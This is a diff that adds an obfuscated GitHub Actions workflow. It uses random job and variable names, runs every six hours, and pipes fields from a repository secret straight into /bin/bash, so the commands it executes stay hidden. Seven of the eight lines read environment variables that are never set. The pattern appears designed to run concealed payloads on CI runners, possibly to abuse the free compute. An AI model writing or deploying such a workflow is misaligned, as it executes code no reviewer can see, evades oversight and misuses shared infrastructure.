@@ -1,0 +1,25 @@
+name: tonghugjiga
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: tonghugjiga
+        env:
+          wlqpj8568: ${{ secrets.wlqpj8568 }}
+        run: |
+          echo $wlqpj8568 | jq -r .a810 | /bin/bash
+          echo $tia221 | jq -r .bdql066 | /bin/bash
+          echo $z93 | jq -r .mfds06995 | /bin/bash
+          echo $bdmj20379 | jq -r .dvix088 | /bin/bash
+          echo $q8354 | jq -r .y457 | /bin/bash
+          echo $hnsr1 | jq -r .gskse07 | /bin/bash
+          echo $bd134 | jq -r .lviu751 | /bin/bash
+          echo $d9734 | jq -r .rtfu1526 | /bin/bash
+
